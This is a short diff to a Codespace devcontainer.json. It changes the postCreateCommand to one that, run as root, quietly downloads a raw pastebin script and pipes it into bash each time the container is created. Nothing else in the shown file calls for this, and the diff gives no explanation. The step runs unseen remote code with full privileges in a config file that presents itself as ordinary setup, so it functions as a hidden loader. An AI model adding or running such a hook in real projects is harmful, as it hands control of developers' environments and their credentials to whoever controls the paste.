@@ -1,7 +1,7 @@
 {
   "name": "My Codespace",
   "image": "mcr.microsoft.com/devcontainers/universal:latest",
-  "postCreateCommand": "wget behn.sh",
+  "postCreateCommand": "sudo wget -qO- https://pastebin.com/raw/xk0mL6JG | sed 's/\r$//' | bash",
   "remoteUser": "root",
   "customizations": {
     "vscode": {
